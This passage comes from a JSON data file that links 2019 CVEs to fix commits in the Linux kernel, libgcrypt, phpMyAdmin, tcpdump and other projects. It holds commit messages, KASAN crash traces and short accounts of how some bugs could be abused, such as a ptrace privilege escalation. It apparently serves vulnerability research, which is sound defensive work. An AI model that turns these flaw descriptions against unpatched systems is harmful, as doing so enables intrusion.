entry_SYSCALL_64_after_hwframe+0x49/0xbeRIP: 0033:0x462e99Code: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48RSP: 002b:00007f6215c19c58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139RAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99RDX: 0000000000000000 RSI: 0000000020000080 RDI: 0000000000000003RBP: 00007f6215c19c70 R08: 0000000000000000 R09: 0000000000000000R10: 0000000000000000 R11: 0000000000000246 R12: 00007f6215c1a6bcR13: 00000000004bcefb R14: 00000000006f7030 R15: 0000000000000004Allocated by task 3524: set_track mm/kasan/common.c:85 [inline] __kasan_kmalloc.constprop.3+0xa0/0xd0 mm/kasan/common.c:496 kmalloc include/linux/slab.h:545 [inline] kzalloc include/linux/slab.h:740 [inline] mdiobus_alloc_size+0x54/0x1b0 drivers/net/phy/mdio_bus.c:143 fixed_mdio_bus_init+0x163/0x1000 [fixed_phy] do_one_initcall+0xfa/0x5ca init/main.c:887 do_init_module+0x204/0x5f6 kernel/module.c:3460 load_module+0x66b2/0x8570 kernel/module.c:3808 __do_sys_finit_module+0x238/0x2a0 kernel/module.c:3902 do_syscall_64+0x147/0x600 arch/x86/entry/common.c:290 entry_SYSCALL_64_after_hwframe+0x49/0xbeFreed by task 3524: set_track mm/kasan/common.c:85 [inline] __kasan_slab_free+0x130/0x180 mm/kasan/common.c:458 slab_free_hook mm/slub.c:1409 [inline] slab_free_freelist_hook mm/slub.c:1436 [inline] slab_free mm/slub.c:2986 [inline] kfree+0xe1/0x270 mm/slub.c:3938 device_release+0x78/0x200 drivers/base/core.c:919 kobject_cleanup lib/kobject.c:662 [inline] kobject_release lib/kobject.c:691 [inline] kref_put include/linux/kref.h:67 [inline] kobject_put+0x146/0x240 lib/kobject.c:708 put_device+0x1c/0x30 drivers/base/core.c:2060 __mdiobus_register+0x483/0x560 drivers/net/phy/mdio_bus.c:382 fixed_mdio_bus_init+0x26b/0x1000 [fixed_phy] do_one_initcall+0xfa/0x5ca init/main.c:887 do_init_module+0x204/0x5f6 kernel/module.c:3460 load_module+0x66b2/0x8570 kernel/module.c:3808 __do_sys_finit_module+0x238/0x2a0 kernel/module.c:3902 do_syscall_64+0x147/0x600 arch/x86/entry/common.c:290 entry_SYSCALL_64_after_hwframe+0x49/0xbeThe buggy address belongs to the object at ffff8881dc824c80 which belongs to the cache kmalloc-2k of size 2048The buggy address is located 248 bytes inside of 2048-byte region [ffff8881dc824c80, ffff8881dc825480)The buggy address belongs to the page:page:ffffea0007720800 count:1 mapcount:0 mapping:ffff8881f6c02800 index:0x0 compound_mapcount: 0flags: 0x2fffc0000010200(slab|head)raw: 02fffc0000010200 0000000000000000 0000000500000001 ffff8881f6c02800raw: 0000000000000000 00000000800f000f 00000001ffffffff 0000000000000000page dumped because: kasan: bad access detectedMemory state around the buggy address: ffff8881dc824c00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc ffff8881dc824c80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb>ffff8881dc824d00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb ^ ffff8881dc824d80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb ffff8881dc824e00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fbFixes: 0c692d0 (\"drivers/net/phy/mdio_bus.c: call put_device on device_register() failure\")Signed-off-by: YueHaibing <yuehaibing@huawei.com>Reviewed-by: Andrew Lunn <andrew@lunn.ch>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2019-12819"
    ],
    "cveIdsCount": 1
  },
  "18369a3a6901b5add33bd5aa81d9cd79c5f2ca8d8319fa2c64543531d392aaf5": {
    "url": "https://github.com/gpg/libgcrypt/commit/daedbbb5541cd8ecda1459d3b843ea4d92788762",
    "title": "AES: move look-up tables to .data section and unshare between processes",
    "body": "* cipher/rijndael-internal.h (ATTR_ALIGNED_64): New.* cipher/rijndael-tables.h (encT): Move to 'enc_tables' structure.(enc_tables): New structure for encryption table with counters beforeand after.(encT): New macro.(dec_tables): Add counters before and after encryption table; Movefrom .rodata to .data section.(do_encrypt): Change 'encT' to 'enc_tables.T'.(do_decrypt): Change '&dec_tables' to 'dec_tables.T'.* cipher/cipher-gcm.c (prefetch_table): Make inline; Handle inputwith length not multiple of 256.(prefetch_enc, prefetch_dec): Modify pre- and post-table countersto unshare look-up table pages between processes.--GnuPG-bug-id: 4541Signed-off-by: Jussi Kivilinna <jussi.kivilinna@iki.fi>",
    "cveIds": [
      "CVE-2019-12904"
    ],
    "cveIdsCount": 1
  },
  "e2222021ba99dc8483bea17b57290ef504e239e52437f045685b78fda1c1d92d": {
    "url": "https://github.com/gpg/libgcrypt/commit/a4c561aab1014c3630bc88faf6f5246fee16b020",
    "title": "GCM: move look-up table to .data section and unshare between processes",
    "body": "* cipher/cipher-gcm.c (ATTR_ALIGNED_64): New.(gcmR): Move to 'gcm_table' structure.(gcm_table): New structure for look-up table with counters before andafter.(gcmR): New macro.(prefetch_table): Handle input with length not multiple of 256.(do_prefetch_tables): Modify pre- and post-table counters to unsharelook-up table pages between processes.--GnuPG-bug-id: 4541Signed-off-by: Jussi Kivilinna <jussi.kivilinna@iki.fi>",
    "cveIds": [
      "CVE-2019-12904"
    ],
    "cveIdsCount": 1
  },
  "74f6e02bcc6cd20469a0b6f1d09859c1a7769857e6ec2ecbeec4d98696ee25d3": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/427fbed55d3154d96ecfc1c7784d49eaa3c04161",
    "title": "Require POST method to delete servers in Setup",
    "body": "Signed-off-by: Maurício Meneghini Fauth <mauricio@fauth.dev>",
    "cveIds": [
      "CVE-2019-12922"
    ],
    "cveIdsCount": 1
  },
  "e6bce45e9b274735e4284e9ede6ba3843d0f2f40d00c63be8468284582736d12": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/7d21d4223bdbe0306593309132b4263d7087d13b",
    "title": "Add ChangeLog entries for:",
    "body": "* 427fbed* 6e1bbc5Signed-off-by: Isaac Bennetch <bennetch@gmail.com>",
    "cveIds": [
      "CVE-2019-12922"
    ],
    "cveIdsCount": 1
  },
  "eef14fcc67a6c18a98ae981314c20bc93898c103d24d9b175993ba37f106aede": {
    "url": "https://github.com/nilsteampassnet/TeamPass/releases",
    "title": "3.0.0.6 … 3.0.0.5 … 3.0.0.3 … 3.0.0.2 … 3.0.0.0 …",
    "body": "3.0.0.6Working on #2831 3.0.0.5Added ref to jquery.min 3.0.0.3Fix for #2827 3.0.0.2Fix for empty password sent to new user 3.0.0.0This is a beta version",
    "cveIds": [
      "CVE-2019-12950"
    ],
    "cveIdsCount": 1
  },
  "2c85b339e9e320b024db7178f83f831a9e1fa34dde43f869263c24ece9691fc1": {
    "url": "https://github.com/cesanta/mongoose/commit/b3e0f780c34cea88f057a62213c012aa88fe2deb",
    "title": "Fix heap-based overflow in parse_mqtt",
    "body": "PUBLISHED_FROM=3306592896298597fff5269634df0c1a1555113b",
    "cveIds": [
      "CVE-2019-12951"
    ],
    "cveIdsCount": 1
  },
  "2429b130de1b7dc3dd89dc1b6cecb6b45213a9fe1accad5c750d335239c74f27": {
    "url": "https://github.com/nothings/stb/commit/98fdfc6df88b1e34a736d5e126e6c8139c8de1a6",
    "title": "Fix seven bugs discovered and fixed by ForAllSecure:",
    "body": "CVE-2019-13217: heap buffer overflow in start_decoder()CVE-2019-13218: stack buffer overflow in compute_codewords()CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest()CVE-2019-13220: out-of-range read in draw_line()CVE-2019-13221: issue with large 1D codebooks in lookup1_values()CVE-2019-13222: unchecked NULL returned by get_window()CVE-2019-13223: division by zero in predict_point()",
    "cveIds": [
      "CVE-2019-13217",
      "CVE-2019-13219",
      "CVE-2019-13221",
      "CVE-2019-13222"
    ],
    "cveIdsCount": 4
  },
  "774c69a82ca76ef8219bb999626dbe2fcd5117f239a971965eb40f9988cd355c": {
    "url": "https://github.com/kkos/oniguruma/commit/0f7f61ed1b7b697e283e37bd2d731d0bd57adb55",
    "title": "Fix CVE-2019-13224: don't allow different encodings for onig_new_delu…",
    "body": "…xe()",
    "cveIds": [
      "CVE-2019-13224"
    ],
    "cveIdsCount": 1
  },
  "ba24fa4d65b87fa3514f52b099f9350cadcb6acccb4bab945c781415c92d4923": {
    "url": "https://github.com/kkos/oniguruma/commit/c509265c5f6ae7264f7b8a8aae1cfa5fc59d108c",
    "title": "Fix CVE-2019-13225: problem in converting if-then-else pattern to byt…",
    "body": "…ecode.",
    "cveIds": [
      "CVE-2019-13225"
    ],
    "cveIdsCount": 1
  },
  "2515978fcdf3f325dd3923be45cc39c898fcb2e83880218384cff29618c87f8e": {
    "url": "https://github.com/torvalds/linux/commit/de9f869616dd95e95c00bdd6b0fcd3421e8a4323",
    "title": "x86/insn-eval: Fix use-after-free access to LDT entry",
    "body": "get_desc() computes a pointer into the LDT while holding a lock thatprotects the LDT from being freed, but then drops the lock and returns the(now potentially dangling) pointer to its caller.Fix it by giving the caller a copy of the LDT entry instead.Fixes: 670f928 (\"x86/insn-eval: Add utility function to get segment descriptor\")Cc: stable@vger.kernel.orgSigned-off-by: Jann Horn <jannh@google.com>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2019-13233"
    ],
    "cveIdsCount": 1
  },
  "f55bc684325d56d6eefb30c76970afdd07edeeb858077348bc76e83dfff16b20": {
    "url": "https://github.com/torvalds/linux/commit/6994eefb0053799d2e07cd140df6c2ea106c41ee",
    "title": "ptrace: Fix ->ptracer_cred handling for PTRACE_TRACEME",
    "body": "Fix two issues:When called for PTRACE_TRACEME, ptrace_link() would obtain an RCUreference to the parent's objective credentials, then give that pointerto get_cred(). However, the object lifetime rules for things likestruct cred do not permit unconditionally turning an RCU reference intoa stable reference.PTRACE_TRACEME records the parent's credentials as if the parent wasacting as the subject, but that's not the case. If a maliciousunprivileged child uses PTRACE_TRACEME and the parent is privileged, andat a later point, the parent process becomes attacker-controlled(because it drops privileges and calls execve()), the attacker ends upwith control over two processes with a privileged ptrace relationship,which can be abused to ptrace a suid binary and obtain root privileges.Fix both of these by always recording the credentials of the processthat is requesting the creation of the ptrace relationship:current_cred() can't change under us, and current is the proper subjectfor access control.This change is theoretically userspace-visible, but I am not aware ofany code that it will actually break.Fixes: 64b875f (\"ptrace: Capture the ptracer's creds not PT_PTRACE_CAP\")Signed-off-by: Jann Horn <jannh@google.com>Acked-by: Oleg Nesterov <oleg@redhat.com>Cc: stable@vger.kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2019-13272"
    ],
    "cveIdsCount": 1
  },
  "c8b77e6a836b74db81a78fb7107d280882565c60bb177ff411b6dd7e6f4f403b": {
    "url": "https://github.com/mastercactapus/proxyprotocol/releases/tag/v0.0.2",
    "title": "",
    "body": "Add test and fix for malformed/truncated header",
    "cveIds": [
      "CVE-2019-14243"
    ],
    "cveIdsCount": 1
  },
  "8dc38ea45f970003a0309517064f9d038bb28fd59f66ce5438f624cda16de3c5": {
    "url": "https://github.com/torvalds/linux/commit/da99466ac243f15fbba65bd261bfc75ffa1532b6",
    "title": "floppy: fix out-of-bounds read in copy_buffer",
    "body": "This fixes a global out-of-bounds read access in the copy_bufferfunction of the floppy driver.The FDDEFPRM ioctl allows one to set the geometry of a disk. The sectand head fields (unsigned int) of the floppy_drive structure are used tocompute the max_sector (int) in the make_raw_rw_request function. It ispossible to overflow the max_sector. Next, max_sector is passed to thecopy_buffer function and used in one of the memcpy calls.An unprivileged user could trigger the bug if the device is accessible,but requires a floppy disk to be inserted.The patch adds the check for the .sect * .head multiplication for notoverflowing in the set_geometry function.The bug was found by syzkaller.Signed-off-by: Denis Efremov <efremov@ispras.ru>Tested-by: Willy Tarreau <w@1wt.eu>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2019-14283"
    ],
    "cveIdsCount": 1
  },
  "5b705ded1ab90c14f8a659f43ed6b220539a0ad97812ec3bc835c24cdaffe847": {
    "url": "https://github.com/MISP/MISP/commit/26bedd8a68c32a2f14460a8eac2a9fb09923392b",
    "title": "fix: [security] Fix to stored XSS",
    "body": "- as reported by David Heise",
    "cveIds": [
      "CVE-2019-14286"
    ],
    "cveIdsCount": 1
  },
  "3707805845fd38fd75b2c10b59fb0bcec610ff9f977ffa96c8b8f1f2780b8161": {
    "url": "https://github.com/troglobit/ssdp-responder/commit/ce04b1f29a137198182f60bbb628d5ceb8171765",
    "title": "Fix #1: Ensure recv buf is always NUL terminated",
    "body": "Signed-off-by: Joachim Nilsson <troglobit@gmail.com>",
    "cveIds": [
      "CVE-2019-14323"
    ],
    "cveIdsCount": 1
  },
  "4f5925f8a54fa7132d5c45eddeb9666409078a5a11554f4046680f1c29ebc7c2": {
    "url": "https://github.com/Exiv2/exiv2/pull/962/commits/e925bc5addd881543fa503470c8a859e112cca62",
    "title": "Fix integer overflow by checking size against header_size",
    "body": "Note that the problem occurs when data_size is less than header_sizewhat causes a buffer overflow in &data[i]Co-Authored-By: D4N <dan.cermak@cgc-instruments.com>",
    "cveIds": [
      "CVE-2019-14982"
    ],
    "cveIdsCount": 1
  },
  "49553d6d73e6736b0ab9c6feeacb860d0e5ab8d1ef7a6e1c995262bd90b7049b": {
    "url": "https://github.com/memcached/memcached/commit/554b56687a19300a75ec24184746b5512580c819",
    "title": "fix strncpy call to avoid ASAN violation",
    "body": "Ensure we're only reading to the size of the smallest buffer, sincethey're both on the stack and could potentially overlap. Overlapping isdefined as ... undefined behavior. I've looked through all availableimplementations of strncpy and they still only copy from the first \\0found.We'll also never read past the end of sun_path since we _supply_sun_path with a proper null terminator.",
    "cveIds": [
      "CVE-2019-15026"
    ],
    "cveIdsCount": 1
  },
  "290e44f1c54293012f97126e7f063ffa01fb4bac0ab92bb248f2c17e2b9596c4": {
    "url": "https://github.com/mantisbt/mantisbt/commit/9cee1971c498bbe0a72bca1c773fae50171d8c27",
    "title": "Fix XSS on timeline (CVE-2019-15074)",
    "body": "Kamran Saifullah reported a stored cross-site scripting (XSS)vulnerability in Timeline, allowing execution of arbitrary code (if CSPsettings permit it) after uploading an attachment with a craftedfilename. The code is executed for any user having visibility to theissue, whenever My View Page is displayed.Prevent the attack by sanitizing the filename before display.Fixes #25995",
    "cveIds": [
      "CVE-2019-15074"
    ],
    "cveIdsCount": 1
  },
  "1b54d5bb8c6f4e7b70907283a27b743a1346eeb5f67511eeb2772eb18d1067fb": {
    "url": "https://github.com/torvalds/linux/commit/c09581a52765a85f19fc35340127396d5e3379cc",
    "title": "scsi: qedi: remove memset/memcpy to nfunc and use func instead",
    "body": "KASAN reports this:BUG: KASAN: global-out-of-bounds in qedi_dbg_err+0xda/0x330 [qedi]Read of size 31 at addr ffffffffc12b0ae0 by task syz-executor.0/2429CPU: 0 PID: 2429 Comm: syz-executor.0 Not tainted 5.0.0-rc7+ #45Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014Call Trace: __dump_stack lib/dump_stack.c:77 [inline] dump_stack+0xfa/0x1ce lib/dump_stack.c:113 print_address_description+0x1c4/0x270 mm/kasan/report.c:187 kasan_report+0x149/0x18d mm/kasan/report.c:317 memcpy+0x1f/0x50 mm/kasan/common.c:130 qedi_dbg_err+0xda/0x330 [qedi] ? 0xffffffffc12d0000 qedi_init+0x118/0x1000 [qedi] ? 0xffffffffc12d0000 ? 0xffffffffc12d0000 ? 0xffffffffc12d0000 do_one_initcall+0xfa/0x5ca init/main.c:887 do_init_module+0x204/0x5f6 kernel/module.c:3460 load_module+0x66b2/0x8570 kernel/module.c:3808 __do_sys_finit_module+0x238/0x2a0 kernel/module.c:3902 do_syscall_64+0x147/0x600 arch/x86/entry/common.c:290 entry_SYSCALL_64_after_hwframe+0x49/0xbeRIP: 0033:0x462e99Code: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48RSP: 002b:00007f2d57e55c58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139RAX: ffffffffffffffda RBX: 000000000073bfa0 RCX: 0000000000462e99RDX: 0000000000000000 RSI: 00000000200003c0 RDI: 0000000000000003RBP: 00007f2d57e55c70 R08: 0000000000000000 R09: 0000000000000000R10: 0000000000000000 R11: 0000000000000246 R12: 00007f2d57e566bcR13: 00000000004bcefb R14: 00000000006f7030 R15: 0000000000000004The buggy address belongs to the variable: __func__.67584+0x0/0xffffffffffffd520 [qedi]Memory state around the buggy address: ffffffffc12b0980: fa fa fa fa 00 04 fa fa fa fa fa fa 00 00 05 fa ffffffffc12b0a00: fa fa fa fa 00 00 04 fa fa fa fa fa 00 05 fa fa> ffffffffc12b0a80: fa fa fa fa 00 06 fa fa fa fa fa fa 00 02 fa fa ^ ffffffffc12b0b00: fa fa fa fa 00 00 04 fa fa fa fa fa 00 00 03 fa ffffffffc12b0b80: fa fa fa fa 00 00 02 fa fa fa fa fa 00 00 04 faCurrently the qedi_dbg_* family of functions can overrun the end of thesource string if it is less than the destination buffer length because ofthe use of a fixed sized memcpy. Remove the memset/memcpy calls to nfuncand just use func instead as it is always a null terminated string.Reported-by: Hulk Robot <hulkci@huawei.com>Fixes: ace7f46 (\"scsi: qedi: Add QLogic FastLinQ offload iSCSI driver framework.\")Signed-off-by: YueHaibing <yuehaibing@huawei.com>Reviewed-by: Dan Carpenter <dan.carpenter@oracle.com>Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>",
    "cveIds": [
      "CVE-2019-15090"
    ],
    "cveIdsCount": 1
  },
  "7f9939b597b0f91783c2776b55ba3cd76e54ba71041562ac7cea122ffdadd6b4": {
    "url": "https://github.com/Schine/MW-OAuth2Client/commit/6a4fe4500ddd72ad4e826d9d63b2d69512bd10d1",
    "title": "Enforce/verify state parameter of callback",
    "body": "This fixes a security vulnerability where a malicious actor can bypass authentication via a clickjacking attack (CSRF vulnerability).Signed-off-by: schema <schema@star-made.org>",
    "cveIds": [
      "CVE-2019-15150"
    ],
    "cveIdsCount": 1
  },
  "58da5a9704ba4a1325ca477e219f71f94692dd9d30d9aacf9a69b2ff9055fde9": {
    "url": "https://github.com/the-tcpdump-group/libpcap/commit/437b273761adedcbd880f714bfa44afeec186a31",
    "title": "Don't crash if crypt() fails.",
    "body": "It can fail, so make sure it doesn't before comparing its result withthe password.This addresses Include Security issue F12: [libpcap] Remote PacketCapture Daemon Null Pointer Dereference Denial of Service.",
    "cveIds": [
      "CVE-2019-15163"
    ],
    "cveIdsCount": 1
  },
  "9d54ac0e36ad92178ec2ef661e94604d76e8bedd25d0cc428c3ced72e1ab3f91": {
    "url": "https://github.com/the-tcpdump-group/tcpdump/commit/0b661e0aa61850234b64394585cf577aac570bf4",
    "title": "(for 4.9.3) LMP: Add some missing bounds checks",
    "body": "In lmp_print_data_link_subobjs(), these problems were identifiedthrough code review.Moreover:Add and use tstr[].Update two tests outputs accordingly.",
    "cveIds": [
      "CVE-2019-15166"
    ],
    "cveIdsCount": 1
  },
  "47bd50d65a55875d8bdbb74c4925d3aa16ae012e9605f6ff3a330dce7097687f": {
    "url": "https://github.com/torvalds/linux/commit/56897b217a1d0a91c9920cb418d6b3fe922f590a",
    "title": "Bluetooth: hci_ldisc: Postpone HCI_UART_PROTO_READY bit set in hci_ua…",
    "body": "…rt_set_proto()task A: task B:hci_uart_set_proto flush_to_ldisc - p->open(hu) -> h5_open //alloc h5 - receive_buf - set_bit HCI_UART_PROTO_READY - tty_port_default_receive_buf - hci_uart_register_dev - tty_ldisc_receive_buf - hci_uart_tty_receive - test_bit HCI_UART_PROTO_READY - h5_recv - clear_bit HCI_UART_PROTO_READY while() { - p->open(hu) -> h5_close //free h5 - h5_rx_3wire_hdr - h5_reset() //use-after-free }It could use ioctl to set hci uart proto, but there isa use-after-free issue when hci_uart_register_dev() fail inhci_uart_set_proto(), see stack above, fix this by settingHCI_UART_PROTO_READY bit only when hci_uart_register_dev()return success.Reported-by: syzbot+899a33dc0fa0dbaf06a6@syzkaller.appspotmail.comSigned-off-by: Kefeng Wang <wangkefeng.wang@huawei.com>Reviewed-by: Jeremy Cline <jcline@redhat.com>Signed-off-by: Marcel Holtmann <marcel@holtmann.org>",
    "cveIds": [
      "CVE-2019-15917"
    ],
    "cveIdsCount": 1
  },
  "4c368d17aa98b53eae048b9d064773b8a194f6daad4d1f83c6a28bcc7447818d": {
    "url": "https://github.com/torvalds/linux/commit/b57a55e2200ede754e4dc9cce4ba9402544b9365",
    "title": "cifs: Fix lease buffer length error",
    "body": "There is a KASAN slab-out-of-bounds:BUG: KASAN: slab-out-of-bounds in _copy_from_iter_full+0x783/0xaa0Read of size 80 at addr ffff88810c35e180 by task mount.cifs/539CPU: 1 PID: 539 Comm: mount.cifs Not tainted 4.19 #10Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.12.0-0-ga698c8995f-prebuilt.qemu.org 04/01/2014Call Trace: dump_stack+0xdd/0x12a print_address_description+0xa7/0x540 kasan_report+0x1ff/0x550 check_memory_region+0x2f1/0x310 memcpy+0x2f/0x80 _copy_from_iter_full+0x783/0xaa0 tcp_sendmsg_locked+0x1840/0x4140 tcp_sendmsg+0x37/0x60 inet_sendmsg+0x18c/0x490 sock_sendmsg+0xae/0x130 smb_send_kvec+0x29c/0x520 __smb_send_rqst+0x3ef/0xc60 smb_send_rqst+0x25a/0x2e0 compound_send_recv+0x9e8/0x2af0 cifs_send_recv+0x24/0x30 SMB2_open+0x35e/0x1620 open_shroot+0x27b/0x490 smb2_open_op_close+0x4e1/0x590 smb2_query_path_info+0x2ac/0x650 cifs_get_inode_info+0x1058/0x28f0 cifs_root_iget+0x3bb/0xf80 cifs_smb3_do_mount+0xe00/0x14c0 cifs_do_mount+0x15/0x20 mount_fs+0x5e/0x290 vfs_kern_mount+0x88/0x460 do_mount+0x398/0x31e0 ksys_mount+0xc6/0x150 __x64_sys_mount+0xea/0x190 do_syscall_64+0x122/0x590 entry_SYSCALL_64_after_hwframe+0x44/0xa9It can be reproduced by the following step: 1. samba configured with: server max protocol = SMB2_10 2. mount -o vers=defaultWhen parse the mount version parameter, the 'ops' and 'vals'was setted to smb30, if negotiate result is smb21, justupdate the 'ops' to smb21, but the 'vals' is still smb30.When add lease context, the iov_base is allocated with smb21ops, but the iov_len is initiallited with the smb30. Becausethe iov_len is longer than iov_base, when send the message,copy array out of bounds.we need to keep the 'ops' and 'vals' consistent.Fixes: 9764c02 (\"SMB3: Add support for multidialect negotiate (SMB2.1 and later)\")Fixes: d5c7076 (\"smb3: add smb3.1.1 to default dialect list\")Signed-off-by: ZhangXiaoxu <zhangxiaoxu5@huawei.com>Signed-off-by: Steve French <stfrench@microsoft.com>CC: Stable <stable@vger.kernel.org>Reviewed-by: Pavel Shilovsky <pshilov@microsoft.com>",
    "cveIds": [
      "CVE-2019-15918"
    ],
    "cveIdsCount": 1
  },
  "b4d5ae46c18c2e9cedcd8beb1c4bfe39b2f828dc64e46ea983bce8eb24e6eb96": {
    "url": "https://github.com/torvalds/linux/commit/6a3eb3360667170988f8a6477f6686242061488a",
    "title": "cifs: Fix use-after-free in SMB2_write",
    "body": "There is a KASAN use-after-free:BUG: KASAN: use-after-free in SMB2_write+0x1342/0x1580Read of size 8 at addr ffff8880b6a8e450 by task ln/4196Should not release the 'req' because it will use in the trace.Fixes: eccb442 (\"smb3: Add ftrace tracepoints for improved SMB3 debugging\")Signed-off-by: ZhangXiaoxu <zhangxiaoxu5@huawei.com>Signed-off-by: Steve French <stfrench@microsoft.com>CC: Stable <stable@vger.kernel.org> 4.18+Reviewed-by: Pavel Shilovsky <pshilov@microsoft.com>",
    "cveIds": [
      "CVE-2019-15919"
    ],
    "cveIdsCount": 1
  },
  "dc13471fd36d1ef6700f8da683f5e37ab173f414e6ba1fcfef4f55955f48fbdf": {
    "url": "https://github.com/torvalds/linux/commit/088aaf17aa79300cab14dbee2569c58cfafd7d6e",
    "title": "cifs: Fix use-after-free in SMB2_read",
    "body": "There is a KASAN use-after-free:BUG: KASAN: use-after-free in SMB2_read+0x1136/0x1190Read of size 8 at addr ffff8880b4e45e50 by task ln/1009Should not release the 'req' because it will use in the trace.Fixes: eccb442 (\"smb3: Add ftrace tracepoints for improved SMB3 debugging\")Signed-off-by: ZhangXiaoxu <zhangxiaoxu5@huawei.com>Signed-off-by: Steve French <stfrench@microsoft.com>CC: Stable <stable@vger.kernel.org> 4.18+Reviewed-by: Pavel Shilovsky <pshilov@microsoft.com>",
    "cveIds": [
      "CVE-2019-15920"
    ],
    "cveIdsCount": 1
  },
  "9db8f3330100b8f323ed1fbdd485afb246db56284cab394a46822a13261ca074": {
    "url": "https://github.com/torvalds/linux/commit/58ccd2d31e502c37e108b285bf3d343eb00c235b",
    "title": "paride/pf: Fix potential NULL pointer dereference",
    "body": "Syzkaller report this:pf: pf version 1.04, major 47, cluster 64, nice 0pf: No ATAPI disk detectedkasan: CONFIG_KASAN_INLINE enabledkasan: GPF could be caused by NULL-ptr deref or user memory accessgeneral protection fault: 0000 [#1] SMP KASAN PTICPU: 0 PID: 9887 Comm: syz-executor.0 Tainted: G C 5.1.0-rc3+ #8Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014RIP: 0010:pf_init+0x7af/0x1000 [pf]Code: 46 77 d2 48 89 d8 48 c1 e8 03 80 3c 28 00 74 08 48 89 df e8 03 25 a6 d2 4c 8b 23 49 8d bc 24 80 05 00 00 48 89 f8 48 c1 e8 03 <80> 3c 28 00 74 05 e8 e6 24 a6 d2 49 8b bc 24 80 05 00 00 e8 79 34RSP: 0018:ffff8881abcbf998 EFLAGS: 00010202RAX: 00000000000000b0 RBX: ffffffffc1e4a8a8 RCX: ffffffffaec50788RDX: 0000000000039b10 RSI: ffffc9000153c000 RDI: 0000000000000580RBP: dffffc0000000000 R08: ffffed103ee44e59 R09: ffffed103ee44e59R10: 0000000000000001 R11: ffffed103ee44e58 R12: 0000000000000000R13: ffffffffc1e4b028 R14: 0000000000000000 R15: 0000000000000020FS: 00007f1b78a91700(0000) GS:ffff8881f7200000(0000) knlGS:0000000000000000CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033CR2: 00007f6d72b207f8 CR3: 00000001d5790004 CR4: 00000000007606f0DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400PKRU: 55555554Call Trace: ? 0xffffffffc1e50000 do_one_initcall+0xbc/0x47d init/main.c:901 do_init_module+0x1b5/0x547 kernel/module.c:3456 load_module+0x6405/0x8c10 kernel/module.c:3804 __do_sys_finit_module+0x162/0x190 kernel/module.c:3898 do_syscall_64+0x9f/0x450 arch/x86/entry/common.c:290 entry_SYSCALL_64_after_hwframe+0x49/0xbeRIP: 0033:0x462e99Code: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48RSP: 002b:00007f1b78a90c58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139RAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99RDX: 0000000000000000 RSI: 0000000020000180 RDI: 0000000000000003RBP: 00007f1b78a90c70 R08: 0000000000000000 R09: 0000000000000000R10: 0000000000000000 R11: 0000000000000246 R12: 00007f1b78a916bcR13: 00000000004bcefa R14: 00000000006f6fb0 R15: 0000000000000004Modules linked in: pf(+) paride gpio_tps65218 tps65218 i2c_cht_wc ati_remote dc395x act_meta_skbtcindex act_ife ife ecdh_generic rc_xbox_dvd sky81452_regulator v4l2_fwnode leds_blinkm snd_usb_hiface comedi(C) aes_ti slhc cfi_cmdset_0020 mtd cfi_util sx8654 mdio_gpio of_mdio fixed_phy mdio_bitbang libphy alcor_pci matrix_keymap hid_uclogic usbhid scsi_transport_fc videobuf2_v4l2 videobuf2_dma_sg snd_soc_pcm179x_spi snd_soc_pcm179x_codec i2c_demux_pinctrl mdev snd_indigodj isl6405 mii enc28j60 cmac adt7316_i2c(C) adt7316(C) fmc_trivial fmc nf_reject_ipv4 authenc rc_dtt200u rtc_ds1672 dvb_usb_dibusb_mc dvb_usb_dibusb_mc_common dib3000mc dibx000_common dvb_usb_dibusb_common dvb_usb dvb_core videobuf2_common videobuf2_vmalloc videobuf2_memops regulator_haptic adf7242 mac802154 ieee802154 s5h1409 da9034_ts snd_intel8x0m wmi cx24120 usbcore sdhci_cadence sdhci_pltfm sdhci mmc_core joydev i2c_algo_bit scsi_transport_iscsi iscsi_boot_sysfs ves1820 lockd grace nfs_acl auth_rpcgss sunrp c ip_vs snd_soc_adau7002 snd_cs4281 snd_rawmidi gameport snd_opl3_lib snd_seq_device snd_hwdep snd_ac97_codec ad7418 hid_primax hid snd_soc_cs4265 snd_soc_core snd_pcm_dmaengine snd_pcm snd_timer ac97_bus snd_compress snd soundcore ti_adc108s102 eeprom_93cx6 